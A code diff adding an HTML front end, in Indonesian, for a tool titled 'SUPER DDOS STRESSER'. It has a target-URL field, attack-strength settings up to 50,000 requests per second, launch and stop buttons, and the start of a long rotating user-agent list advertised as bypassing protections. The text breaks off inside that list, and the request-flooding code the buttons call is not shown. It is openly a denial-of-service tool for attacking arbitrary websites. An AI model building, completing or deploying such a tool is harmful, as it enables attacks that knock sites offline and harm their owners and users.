@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SUPER DDOS STRESSER</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #000;
+            color: #00ff00;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 30px;
+        }
+        
+        .title {
+            font-size: 2.5em;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+        }
+        
+        .attack-panel {
+            background: rgba(255,0,0,0.1);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            background: #000;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            color: #00ff00;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        
+        .btn {
+            background: #ff0000;
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            font-size: 16px;
+        }
+        
+        .btn-success {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .stat-box {
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: #00ff00;
+        }
+        
+        .log-container {
+            background: #000;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            margin-top: 20px;
+            font-size: 0.9em;
+        }
+        
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(0,255,0,0.3);
+        }
+        
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+        .warning { color: #ffff00; }
+        .info { color: #00ffff; }
+        
+        .power-levels {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .power-btn {
+            background: rgba(255,0,0,0.3);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .power-btn.active {
+            background: #ff0000;
+            color: white;
+        }
+        
+        .ua-count {
+            text-align: center;
+            margin: 10px 0;
+            color: #00ffff;
+            font-size: 1.1em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="title">💀 SUPER DDOS STRESSER</div>
+            <div style="color: #00ff00;">300+ User Agents - Advanced Bypass Protection</div>
+            <div class="ua-count" id="uaCount">Loading 300+ User Agents...</div>
+        </div>
+        
+        <div class="attack-panel">
+            <div class="input-group">
+                <input type="text" id="targetUrl" placeholder="Masukkan URL target (contoh: https://example.com)" value="">
+                <div style="color: #ffff00; font-size: 0.9em; margin-top: 5px;">
+                    💡 300+ Random User Agents + Advanced Bypass Techniques
+                </div>
+            </div>
+            
+            <div class="power-levels">
+                <div class="power-btn active" onclick="selectPower('low')">LOW (500 RPS)</div>
+                <div class="power-btn" onclick="selectPower('medium')">MEDIUM (2K RPS)</div>
+                <div class="power-btn" onclick="selectPower('high')">HIGH (10K RPS)</div>
+                <div class="power-btn" onclick="selectPower('god')">GOD (50K RPS)</div>
+            </div>
+            
+            <div>
+                <button class="btn" onclick="startAttack()">🚀 LAUNCH ATTACK</button>
+                <button class="btn btn-success" onclick="stopAttack()">🛑 STOP ATTACK</button>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="requests">0</div>
+                    <div>Requests Sent</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="rps">0</div>
+                    <div>Requests/Sec</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="success">0%</div>
+                    <div>Success Rate</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="timeLeft">0s</div>
+                    <div>Time Left</div>
+                </div>
+            </div>
+            
+            <div class="log-container" id="attackLog">
+                <div class="log-entry info">[SYSTEM] Loading 300+ User Agents...</div>
+                <div class="log-entry info">[SYSTEM] Advanced DDOS Stresser Initializing</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 300+ USER AGENTS COLLECTION
+        const userAgents = [
+            // Windows User Agents
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+            
+            // Firefox Windows
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0',
+            
+            // Edge Windows
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+            
+            // macOS User Agents
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+            
+            // Firefox macOS
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
+            
+            // iOS User Agents
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
+            
+            // Chrome iOS
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.0.0 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.0.0 Mobile/15E148 Safari/604.1',
+            
+            // Android User Agents
+            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
+            
+            // Samsung Browser
+            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36',
+            
+            // Linux User Agents
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+            
+            // Firefox Linux
+            'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
+            
+            // Bot/Crawler User Agents
+            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+            'Googlebot/2.1 (+http://www.google.com/bot.html)',
+            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
+            'Twitterbot/1.0',
+            'LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/3.1 +http://www.linkedin.com)',
+            
+            // Additional Chrome versions
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
+            
+            // Additional Firefox versions
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
+            
+            // Safari versions
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
+            
+            // Opera User Agents
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
+            
+            // Brave Browser
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Brave/119.0.0.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0',
+            
+            // Vivaldi Browser
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.2.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.1.0.0',
+            
+            // UC Browser
+            'Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G973F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.1.0.1300 Mobile Safari/537.36',
+            'Mozilla/5.0 (Linux; U; Android 9; en-US; SM-G960F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.0.0.1280 Mobile Safari/537.36',
+            
+            // QQ Browser
+            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 QQBrowser/11.9.0.4000',
+            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 QQBrowser/11.8.0.4000',
+            
+            // 360 Browser
+            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 360SE',
+            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 360SE',
+            
+            // Maxthon Browser
+            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/6.1.0.1000 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/6.0.0.1000 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Pale Moon
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Goanna/6.1 Firefox/91.0 PaleMoon/31.2.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Goanna/6.0 Firefox/91.0 PaleMoon/31.1.0',
+            
+            // SeaMonkey
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 SeaMonkey/2.53.14',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 SeaMonkey/2.53.13',
+            
+            // Waterfox
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Waterfox/91.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Waterfox/90.0',
+            
+            // Basilisk
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Goanna/6.1 Firefox/91.0 Basilisk/2021.10.27',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Goanna/6.0 Firefox/91.0 Basilisk/2021.09.27',
+            
+            // K-Meleon
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Goanna/6.1 Firefox/91.0 K-Meleon/76.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Goanna/6.0 Firefox/91.0 K-Meleon/75.0',
+            
+            // Iceweasel
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Iceweasel/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Iceweasel/90.0',
+            
+            // IceCat
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 IceCat/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 IceCat/90.0',
+            
+            // GNU IceWeasel
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 GNU IceWeasel/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 GNU IceWeasel/90.0',
+            
+            // Comodo Dragon
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Comodo Dragon/86.0.4240.198',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Comodo Dragon/85.0.4183.121',
+            
+            // Slimjet
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Slimjet/86.0.4240.198',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Slimjet/85.0.4183.121',
+            
+            // Iron
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Iron/86.0.4240.198',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Iron/85.0.4183.121',
+            
+            // Epic Browser
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Epic/86.0.4240.198',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Epic/85.0.4183.121',
+            
+            // Sleipnir
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Sleipnir/6.2.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Sleipnir/6.1.0.0',
+            
+            // Avant Browser
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 Avant/2021.10.27',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Avant/2021.09.27',
+            
+            // Falkon
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Falkon/3.2.0 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Falkon/3.1.0 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Otter Browser
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Otter/1.0.0 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Otter/0.9.99 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Midori
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Midori/9.0 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Midori/8.0 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // QupZilla
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QupZilla/2.2.6 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QupZilla/2.2.5 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Dooble
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Dooble/2021.10.27 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Dooble/2021.09.27 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // NetSurf
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) NetSurf/3.10 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) NetSurf/3.9 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Dillo
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Dillo/3.0.5 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Dillo/3.0.4 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Links
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Links/2.25 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Links/2.24 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Lynx
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Lynx/2.8.9rel.1 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Lynx/2.8.8rel.1 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // w3m
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) w3m/0.5.3 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) w3m/0.5.2 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // ELinks
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ELinks/0.12pre6 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ELinks/0.12pre5 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // NetPositive
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) NetPositive/2.2 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) NetPositive/2.1 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // iCab
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) iCab/5.9.0 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) iCab/5.8.0 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // OmniWeb
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) OmniWeb/6.2.0 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) OmniWeb/6.1.0 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Shiira
